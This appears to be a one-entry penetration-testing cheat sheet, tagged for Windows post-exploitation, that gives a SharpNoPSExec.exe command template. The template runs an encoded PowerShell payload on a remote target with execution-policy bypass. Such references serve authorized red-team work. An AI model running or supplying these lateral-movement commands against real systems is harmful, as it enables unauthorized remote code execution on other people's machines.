# SharpNoPSExec.exe
% windows, network

#plateform/windows #target/remote #cat/POSTEXPLOIT

## Remote - Exec command
```
SharpNoPSExec.exe --target=<ip> --payload="c:\windows\system32\cmd.exe /c powershell -exec bypass -nop -e <b64enc_payload>"
```
